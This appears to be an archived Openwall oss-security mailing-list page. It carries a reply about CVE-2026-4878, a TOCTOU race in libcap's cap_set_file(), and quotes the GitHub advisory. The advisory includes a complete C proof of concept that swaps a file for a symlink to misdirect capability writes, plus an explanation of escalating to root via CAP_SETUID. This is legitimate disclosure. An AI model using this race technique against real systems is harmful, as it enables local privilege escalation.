@@ -1,0 +1,413 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<title>oss-security - Re: libcap-2.77 (since libcap-2.04) has TOCTOU privilege escalation issue</title>
+
+<link href="/style.css" type="text/css" rel="stylesheet">
+<style type="text/css">
+.calendar { text-align: center; }
+.ccell { background: #ccc; width: 5ex; padding: 2px; }
+
+.cal_brief { text-align: center; }
+.cal_brief td:first-child { background: inherit; }
+.cal_brief td { background: #ccc; width: 5ex; padding: 2px; }
+.cal_big { text-align: center; padding: 0; margin: 0; }
+.cal_big td { padding: 0 2px; }
+.cal_mon { text-align: center; }
+.cal_mon th { font-size: small; padding: 0; margin: 0; }
+.cal_mon td { background: #ccc; width: 5ex; height: 1.5em;
+	padding: 2px; text-align: right; }
+.cal_mon td[colspan] { background: inherit; }
+.cal_mon sup { color: #F0F0F0; text-align: left; float: left;
+	margin-top: -2pt; font-weight: bold; }
+.cal_mon a { text-align: right; margin-left: -4em; float: right; }
+</style>
+</head>
+
+<BODY bgcolor="#E0E0E0" text="black" link="blue" alink="red" vlink="navy">
+
+
+<table bgcolor="#ffffff" width="100%" border="0" cellspacing="0" cellpadding="0">
+<tr>
+
+<td>
+<a href="/"><img class="logo" src="/logo.png" border="0" width="182" height="80" alt="Openwall"></a>
+<td width="100%">
+<div class="nav">
+<ul>
+<li><a href="/">Products</a>
+<ul>
+<li><a href="/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
+<li><a href="/lkrg/">Linux Kernel Runtime Guard</a>
+<li><a href="/john/">John the Ripper &nbsp; <i>password cracker</i></a>
+<ul>
+<li><a href="/john/">Free &amp; Open Source for any platform</a>
+<li><a href="/john/cloud/">in the cloud</a>
+<li><a href="/john/pro/linux/">Pro for Linux</a>
+<li><a href="/john/pro/macosx/">Pro for macOS</a>
+</ul>
+<li><a href="/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
+<li><a href="/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
+<ul>
+<li><a href="/passwdqc/">Free &amp; Open Source for Unix</a>
+<li><a href="/passwdqc/windows/">Pro for Windows (Active Directory)</a>
+</ul>
+<li><a href="/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
+<li><a href="/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
+<li><a href="/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
+<li><a href="/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
+<li><a href="/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
+<li><a href="/pam/">Pluggable Authentication Modules</a>
+<li><a href="/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
+<li><a href="/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
+<li><a href="/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
+<li><a href="/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
+<li><a href="/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
+</ul>
+<li><a href="/services/">Services</a>
+<li id="narrow-li-1"><a>Publications</a>
+<ul>
+<li><a href="/articles/">Articles</a>
+<li><a href="/presentations/">Presentations</a>
+</ul>
+<li><a>Resources</a>
+<ul>
+<li><a href="/lists/">Mailing lists</a>
+<li><a href="https://openwall.info/wiki/">Community wiki</a>
+<li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
+<li><a href="/mirrors/">File archive &amp; mirrors</a>
+<li><a href="/signatures/">How to verify digital signatures</a>
+<li><a href="/ove/">OVE IDs</a>
+</ul>
+<li id="last-li"><a href="/news">What's new</a>
+</ul>
+</div>
+
+
+</table>
+
+
+<TABLE bgcolor="#B4D0DC" width="100%" border="0" cellspacing="0" cellpadding="1">
+<TR><TD>
+<TABLE width="100%" border="0" cellspacing="0" cellpadding="2">
+<TR><TD bgcolor="#ECF8FF">
+<a href="https://twitter.com/openwall">
+Follow @Openwall on Twitter for new release announcements and other news</a>
+
+</TABLE>
+</TABLE>
+
+<a href="4">[&lt;prev]</a> <a href="6">[next&gt;]</a> <a href="../../../2026/04/08/9">[&lt;thread-prev]</a> <a href="6">[thread-next&gt;]</a> <a href=".">[day]</a> <a href="..">[month]</a> <a href="../..">[year]</a> <a href="../../..">[list]</a>
+<pre style="white-space: pre-wrap">
+Message-ID: &lt;20260409013620.GA13098&#64;openwall.com&gt;
+Date: Thu, 9 Apr 2026 03:36:20 +0200
+From: Solar Designer &lt;solar&#64;...nwall.com&gt;
+To: oss-security&#64;...ts.openwall.com
+Cc: "Andrew G. Morgan" &lt;morgan&#64;...nel.org&gt;,
+	Ali Raza &lt;elirazamumtaz&#64;...il.com&gt;
+Subject: Re: libcap-2.77 (since libcap-2.04) has TOCTOU privilege escalation issue
+
+Hi all,
+
+I think Andrew may not be subscribed - CC'ing.
+
+On Tue, Apr 07, 2026 at 10:14:42PM +0200, Christian Göttsche wrote:
+&gt; Apr 7, 2026 18:54:22 Andrew G. Morgan &lt;morgan&#64;...nel.org&gt;:
+&gt; &gt; I've just released libcap-2.78 which includes a fix for a TOCTOU issue
+&gt; &gt; in libcap.
+&gt; &gt;
+&gt; &gt; The issue has been allocated the following code: CVE-2026-4878. It is
+&gt; &gt; the subject of this private bug:
+&gt; &gt; <a href="https://bugzilla.redhat.com/show_bug.cgi?id=2447554" rel="nofollow">https://bugzilla.redhat.com/show_bug.cgi?id=2447554</a> and is also
+&gt; &gt; written up in a github.com advisory which I will publish on Wednesday
+&gt; &gt; (this week). The github advisory tool characterizes the issue as
+&gt; &gt; CVSS:3.1/AV:L/AC:H/PR:L/UI:R/S:U/C:H/I:H/A:H (Severity: Moderate 7 /
+&gt; &gt; 10).
+&gt; &gt;
+&gt; &gt; The fix for pretty much that whole range of libcap releases is this commit:
+&gt; &gt;
+&gt; &gt; <a href="https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=286ace1259992bd0c5d9016715833f2e148ac596" rel="nofollow">https://git.kernel.org/pub/scm/libs/libcap/libcap.git/commit/?id=286ace1259992bd0c5d9016715833f2e148ac596</a>
+&gt; 
+&gt; Hi,
+&gt; 
+&gt; the new code suppports changing the file capabilities of all kinds of files (not just regular)(given that the caller has read permissions).
+&gt; Is that intended?
+
+Andrew, please comment on this.  I do also see it in the patch that the
+S_ISREG check is now below the added fast path code for readable files.
+It doesn't matter that the S_ISLNK check is also below (in fact, it's
+now redundant anyway) due to O_NOFOLLOW, but bypass of the S_ISREG check
+appears to be a functional change.
+
+Also, was the fact that cap_set_file() refuses to operate over a symlink
+(for the last pathname component only) documented and expected behavior?
+Maybe not documented, but assumed expected?  The advisory says:
+
+&gt; for example, an administrator running setcap, a CI/CD pipeline setting
+&gt; capabilities on build artifacts, a container runtime configuring
+&gt; binaries, or a package manager post-install script) can exploit the race
+&gt; to redirect file capabilities to their own executable. The attacker
+&gt; never needs elevated privileges; only write access to the directory
+&gt; containing the target path.
+
+While this sounds valid, making changes in an attacker-writable
+directory is inherently dangerous, and I wouldn't see why expectations
+for cap_set_file() and setcap would be different than for chmod() and
+chmod, which follow symlinks, if there weren't already this incomplete
+racy attempt of pre-checking for and refusing to operate on symlinks.
+
+&gt; &gt; PS I tried a few times to post to the private openwall list about this
+&gt; &gt; issue 9 days ago, but my email bounced (likely because I couldn't
+&gt; &gt; effectively follow the mail formatting requirements). I might have
+&gt; &gt; realized that the emails were bounced if gmail hadn't silently placed
+&gt; &gt; the bounced replies in my SPAM folder. Sorry about that.
+
+Sorry you had difficulties with that.  I just searched through the logs,
+but could not easily find traces of you trying to send this to the
+linux-distros list.  Can you please forward the bounce to me off-list?
+
+As to your oss-security postings presumably flagged by Gmail as spam,
+that is likely due to us breaking DKIM with the addition of the
+[oss-security] prefix and kernel.org having DMARC p=quarantine.  In
+cases like this, a workaround is to pre-add [oss-security] on your end
+(and when you add to the thread, reply to your messages as they arrived
+through the list rather than to your local copies without the prefix).
+Sorry about that as well.
+
+Let's also have the GitHub advisory archived in here:
+
+<a href="https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh" rel="nofollow">https://github.com/AndrewGMorgan/libcap_mirror/security/advisories/GHSA-f78v-p5hx-m7hh</a>
+
+&gt; Local Privilege Escalation (LPE) via TOCTOU race condition in cap_set_file() through file capability injection
+&gt; Moderate
+&gt; AndrewGMorgan published GHSA-f78v-p5hx-m7hh 11 hours ago
+&gt; 
+&gt; Package
+&gt; libcap (Library)
+&gt; 
+&gt; Affected versions
+&gt; &gt;= 2.04, &lt;= 2.77
+&gt; 
+&gt; Patched versions
+&gt; 2.78
+&gt; 
+&gt; Summary
+&gt; 
+&gt; A TOCTOU (Time-of-Check-Time-of-Use) race condition in cap_set_file() allows an unprivileged local attacker to redirect file capability writes to an arbitrary file, leading to local privilege escalation. The function validates the target path with lstat() (which does not follow symlinks) but then operates on it with setxattr() (which does follow symlinks). Between these two calls, an attacker with write access to the parent directory can atomically swap the regular file for a symlink or a different file via renameat2(RENAME_EXCHANGE), causing setxattr() to write the security.capability xattr to the attacker's chosen file instead of the intended target.
+&gt; 
+&gt; Details
+&gt; 
+&gt; The vulnerability is in libcap/cap_file.c, function cap_set_file():
+&gt; 
+&gt; int cap_set_file(const char *filename, cap_t cap_d)
+&gt; {
+&gt;     struct vfs_ns_cap_data rawvfscap;
+&gt;     int sizeofcaps;
+&gt;     struct stat buf;
+&gt; 
+&gt;     // CHECK: lstat does NOT follow symlinks
+&gt;     if (lstat(filename, &amp;buf) != 0) {
+&gt;         return -1;
+&gt;     }
+&gt;     if (S_ISLNK(buf.st_mode) || !S_ISREG(buf.st_mode)) {
+&gt;         errno = EINVAL;
+&gt;         return -1;
+&gt;     }
+&gt; 
+&gt;     // ... _fcaps_save() computation widens the race window ...
+&gt; 
+&gt;     if (cap_d == NULL) {
+&gt;         // USE: removexattr FOLLOWS symlinks
+&gt;         return removexattr(filename, XATTR_NAME_CAPS); 
+&gt;     }
+&gt; 
+&gt;     // USE: setxattr FOLLOWS symlinks
+&gt;     return setxattr(filename, XATTR_NAME_CAPS, &amp;rawvfscap, sizeofcaps, 0); 
+&gt; }
+&gt; 
+&gt; The gap between lstat() and setxattr() or removexattr() creates a race window. During this window an attacker with write access to the parent directory can use renameat2(RENAME_EXCHANGE) to atomically swap the legitimate regular file with either a symlink pointing to the attacker's target or a completely different file. Since setxattr() resolves the path from scratch (following symlinks), it writes the capability xattr to the wrong file.
+&gt; 
+&gt; The same pattern affects the removexattr() path at when cap_d == NULL, allowing an attacker to strip capabilities from an unintended file.
+&gt; 
+&gt; For comparison, the fd-based counterpart cap_set_fd() is not vulnerable because it uses fstat() + fsetxattr() on an already-opened file descriptor, which pins the inode.
+&gt; 
+&gt; The setcap tool progs/setcap.c calls cap_set_file() directly with a user-supplied path, making it the primary attack surface.
+&gt; 
+&gt; PoC
+&gt; 
+&gt; The following self-contained C program deterministically reproduces the vulnerability by executing the lstat → swap → setxattr sequence step by step. No race timing is required.
+&gt; 
+&gt; Requirements: Linux 3.15+ (for renameat2), root or CAP_SETFCAP.
+&gt; 
+&gt; Build and run:
+&gt; 
+&gt; gcc -Wall -O2 -o poc poc.c
+&gt; sudo ./poc
+&gt; 
+&gt; #define _GNU_SOURCE
+&gt; #include &lt;stdio.h&gt;
+&gt; #include &lt;stdlib.h&gt;
+&gt; #include &lt;string.h&gt;
+&gt; #include &lt;unistd.h&gt;
+&gt; #include &lt;fcntl.h&gt;
+&gt; #include &lt;errno.h&gt;
+&gt; #include &lt;sys/stat.h&gt;
+&gt; #include &lt;sys/xattr.h&gt;
+&gt; #include &lt;sys/syscall.h&gt;
+&gt; 
+&gt; #ifndef SYS_renameat2
+&gt; #define SYS_renameat2 316
+&gt; #endif
+&gt; #ifndef RENAME_EXCHANGE
+&gt; #define RENAME_EXCHANGE (1 &lt;&lt; 1)
+&gt; #endif
+&gt; 
+&gt; #define XATTR_NAME_CAPS "security.capability"
+&gt; 
+&gt; /*
+&gt;  * Minimal VFS_CAP_REVISION_2 xattr granting CAP_NET_RAW=ep.
+&gt;  *
+&gt;  * struct vfs_cap_data {
+&gt;  *   __le32 magic_etc;    // VFS_CAP_REVISION_2 | VFS_CAP_FLAGS_EFFECTIVE
+&gt;  *   struct { __le32 permitted, inheritable; } data[2];
+&gt;  * };
+&gt;  *
+&gt;  * CAP_NET_RAW = 13 -&gt; bit 13 in data[0].permitted = 0x00002000
+&gt;  */
+&gt; static const unsigned char xattr_cap_net_raw[20] = {
+&gt;     0x01, 0x00, 0x00, 0x02,  /* magic: VFS_CAP_REVISION_2 | EFFECTIVE */
+&gt;     0x00, 0x20, 0x00, 0x00,  /* data[0].permitted = 1 &lt;&lt; 13 */
+&gt;     0x00, 0x00, 0x00, 0x00,  /* data[0].inheritable = 0 */
+&gt;     0x00, 0x00, 0x00, 0x00,  /* data[1].permitted = 0 */
+&gt;     0x00, 0x00, 0x00, 0x00,  /* data[1].inheritable = 0 */
+&gt; };
+&gt; 
+&gt; static char arena[256], decoy[280], target[280], link_path[280];
+&gt; 
+&gt; static void cleanup(void) {
+&gt;     removexattr(target, XATTR_NAME_CAPS);
+&gt;     unlink(decoy); unlink(link_path); unlink(target); rmdir(arena);
+&gt; }
+&gt; 
+&gt; int main(void)
+&gt; {
+&gt;     struct stat st;
+&gt;     int fd, ret;
+&gt;     char buf[20];
+&gt;     ssize_t len;
+&gt; 
+&gt;     if (geteuid() != 0) {
+&gt;         fprintf(stderr, "Requires root (for setxattr on security.capability).\n");
+&gt;         return 1;
+&gt;     }
+&gt; 
+&gt;     snprintf(arena,     sizeof(arena),     "/tmp/cve_poc_%d", getpid());
+&gt;     snprintf(decoy,     sizeof(decoy),     "%s/decoy",  arena);
+&gt;     snprintf(target,    sizeof(target),     "%s/target", arena);
+&gt;     snprintf(link_path, sizeof(link_path),  "%s/link",   arena);
+&gt; 
+&gt;     atexit(cleanup);
+&gt;     mkdir(arena, 0755);
+&gt; 
+&gt;     fd = open(decoy, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
+&gt;     fd = open(target, O_CREAT|O_WRONLY|O_TRUNC, 0755); close(fd);
+&gt;     if (symlink(target, link_path) != 0) { perror("symlink"); return 1; }
+&gt; 
+&gt;     printf("cap_set_file() TOCTOU — deterministic proof\n\n");
+&gt; 
+&gt;     /* Step 1: lstat sees a regular file — cap_set_file() check passes */
+&gt;     lstat(decoy, &amp;st);
+&gt;     printf("[+] lstat(\"%s\"): S_ISREG=%d S_ISLNK=%d\n",
+&gt;            decoy, S_ISREG(st.st_mode), S_ISLNK(st.st_mode));
+&gt;     printf("    cap_set_file() symlink check PASSES\n\n");
+&gt; 
+&gt;     /* Step 2: attacker atomically swaps decoy with symlink */
+&gt;     ret = syscall(SYS_renameat2, AT_FDCWD, link_path,
+&gt;                   AT_FDCWD, decoy, RENAME_EXCHANGE);
+&gt;     if (ret != 0) {
+&gt;         fprintf(stderr, "renameat2 failed: %s\n", strerror(errno));
+&gt;         return 1;
+&gt;     }
+&gt; 
+&gt;     lstat(decoy, &amp;st);
+&gt;     printf("[+] Attacker swaps (renameat2 RENAME_EXCHANGE):\n");
+&gt;     printf("    lstat(\"%s\"): S_ISLNK=%d — now a symlink\n\n", decoy,
+&gt;            S_ISLNK(st.st_mode));
+&gt; 
+&gt;     /* Step 3: setxattr follows the symlink — writes caps to target */
+&gt;     ret = setxattr(decoy, XATTR_NAME_CAPS,
+&gt;                    xattr_cap_net_raw, sizeof(xattr_cap_net_raw), 0);
+&gt;     printf("[+] setxattr(\"%s\", \"security.capability\", ...): %s\n",
+&gt;            decoy, ret == 0 ? "OK" : strerror(errno));
+&gt;     printf("    setxattr FOLLOWED the symlink to target\n\n");
+&gt; 
+&gt;     /* Step 4: verify capabilities landed on the target file */
+&gt;     len = getxattr(target, XATTR_NAME_CAPS, buf, sizeof(buf));
+&gt;     printf("[+] getxattr(\"%s\"): %zd bytes\n", target, len);
+&gt; 
+&gt;     if (len &gt; 0) {
+&gt;         printf("\n    BUG CONFIRMED: capabilities written to WRONG file.\n");
+&gt;         return 0;
+&gt;     } else {
+&gt;         printf("\n    Unexpected: xattr not found on target.\n");
+&gt;         return 1;
+&gt;     }
+&gt; }
+&gt; 
+&gt; Expected output:
+&gt; 
+&gt; cap_set_file() TOCTOU — deterministic proof
+&gt; 
+&gt; [+] lstat("/tmp/cve_poc_XXXX/decoy"): S_ISREG=1 S_ISLNK=0
+&gt;     cap_set_file() symlink check PASSES
+&gt; 
+&gt; [+] Attacker swaps (renameat2 RENAME_EXCHANGE):
+&gt;     lstat("/tmp/cve_poc_XXXX/decoy"): S_ISLNK=1 — now a symlink
+&gt; 
+&gt; [+] setxattr("/tmp/cve_poc_XXXX/decoy", "security.capability", ...): OK
+&gt;     setxattr FOLLOWED the symlink to target
+&gt; 
+&gt; [+] getxattr("/tmp/cve_poc_XXXX/target"): 20 bytes
+&gt; 
+&gt;     BUG CONFIRMED: capabilities written to WRONG file.
+&gt; 
+&gt; Impact
+&gt; 
+&gt; This is a local privilege escalation vulnerability (CWE-367).
+&gt; 
+&gt; An unprivileged local attacker who has write access to a directory where a privileged process calls cap_set_file() (for example, an administrator running setcap, a CI/CD pipeline setting capabilities on build artifacts, a container runtime configuring binaries, or a package manager post-install script) can exploit the race to redirect file capabilities to their own executable. The attacker never needs elevated privileges; only write access to the directory containing the target path.
+&gt; 
+&gt; By injecting capabilities such as CAP_SETUID onto their own binary, the attacker can then execute it, call setuid(0), and escalate to root.
+&gt; 
+&gt; The attacker's primitives are:
+&gt; 
+&gt;   - Arbitrary file capability injection: redirect any cap_set_file() call to write capabilities to an attacker-chosen file on the same filesystem.
+&gt;   - Arbitrary file capability removal: redirect the removexattr() path (when cap_d == NULL) to strip capabilities from an unintended file, enabling defense evasion.
+&gt; 
+&gt; All versions of libcap that include the symlink check in cap_set_file() are believed to be affected. The setcap tool shipped with libcap is the primary real-world attack vector as it calls cap_set_file() directly with a user-supplied path argument.
+
+Is there a good way to extract Markdown source from GitHub advisories,
+such as for posting in here?  That would probably have preserved more of
+the formatting.
+
+Thanks,
+
+Alexander
+</pre>
+<p><a href="https://www.openwall.com/blists/">Powered by blists</a> - <a href="https://lists.openwall.net">more mailing lists</a>
+
+
+<p>
+Please check out the
+<a href="https://oss-security.openwall.org/wiki/">
+Open Source Software Security Wiki</a>, which is counterpart to this
+<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
+<p>
+Confused about <a href="/lists/">mailing lists</a> and their use?
+<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
+and check out these
+<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
+<p>
+
+</body>
+</html>
